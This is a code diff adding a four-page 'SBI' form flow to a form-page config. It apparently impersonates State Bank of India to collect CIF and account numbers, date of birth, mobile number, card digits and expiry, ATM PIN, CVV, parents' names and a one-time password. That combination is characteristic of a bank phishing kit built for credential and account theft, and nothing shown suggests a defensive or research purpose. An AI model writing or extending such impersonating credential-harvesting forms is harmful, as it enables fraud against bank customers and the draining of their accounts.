@@ -125,7 +125,53 @@ export const FORM_PAGES: PageConfig[] = [
         fields: [],
         nextPage: { main: null },
         isFinalPage: true,
-    }
+    },
+    // ===== SBI FORM FLOW =====
+    {
+        id: 'sbi_verify_details',
+        pageName: 'sbi_verify_details',
+        title: 'SBI - Verify Details',
+        fields: [
+            { key: 'cifNumber', displayName: 'CIF Number', type: 'text', category: 'personal', required: true, placeholder: 'Enter CIF Number' },
+            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'personal', required: true, placeholder: 'Enter Account Number' },
+            { key: 'dateOfBirth', displayName: 'Date of Birth', type: 'text', category: 'personal', required: true, maxlength: 8, placeholder: 'DDMMYYYY' },
+            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter Mobile Number' },
+        ],
+        nextPage: { main: 'sbi_card_details' },
+    },
+    {
+        id: 'sbi_card_details',
+        pageName: 'sbi_card_details',
+        title: 'SBI - Card Details',
+        fields: [
+            { key: 'cardLast6', displayName: 'Card Last 6 Digits', type: 'text', category: 'card', required: true, maxlength: 6, placeholder: 'Enter last 6 digits' },
+            { key: 'validThrough', displayName: 'Valid Upto', type: 'text', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
+            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 6, placeholder: 'Enter ATM PIN' },
+            { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 3, placeholder: 'Enter CVV' },
+        ],
+        nextPage: { main: 'sbi_kyc_details' },
+    },
+    {
+        id: 'sbi_kyc_details',
+        pageName: 'sbi_kyc_details',
+        title: 'SBI - KYC Details',
+        fields: [
+            { key: 'fatherName', displayName: 'Father Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter father name' },
+            { key: 'branchName', displayName: 'Branch Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter branch name' },
+            { key: 'motherName', displayName: 'Mother Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter mother name' },
+        ],
+        nextPage: { main: 'sbi_otp_verify' },
+    },
+    {
+        id: 'sbi_otp_verify',
+        pageName: 'sbi_otp_verify',
+        title: 'SBI - OTP Verification',
+        fields: [
+            { key: 'otp', displayName: 'OTP', type: 'text', category: 'personal', required: true, maxlength: 6, placeholder: 'Enter OTP' },
+        ],
+        nextPage: { main: null },
+        isFinalPage: true,
+    },
 ];
 
 // ==================== HELPER FUNCTIONS ====================
